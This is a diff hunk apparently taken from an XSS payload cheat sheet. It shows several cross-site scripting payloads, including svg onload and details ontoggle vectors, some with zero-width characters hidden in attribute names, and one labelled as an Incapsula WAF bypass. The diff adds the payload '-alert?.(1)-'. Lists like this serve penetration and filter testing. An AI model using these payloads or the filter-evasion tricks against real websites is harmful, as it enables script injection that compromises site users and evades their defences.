@@ -2703,4 +2703,5 @@ foo<script>alert(1)</script>
 <bgsound><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
 <xmp><p title="</#{endtag}><svg/onload​=alert(#{starttag})>">
 ">'><details/open/ontoggle​=confirm('XSS')>
-incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">```
+incapsula bypass: <iframe/onload​="var b ='document.domain)'; var a = 'JaV' + 'ascRipt:al' + 'ert(' + b;this['src']=a">
+'-alert?.(1)-'```
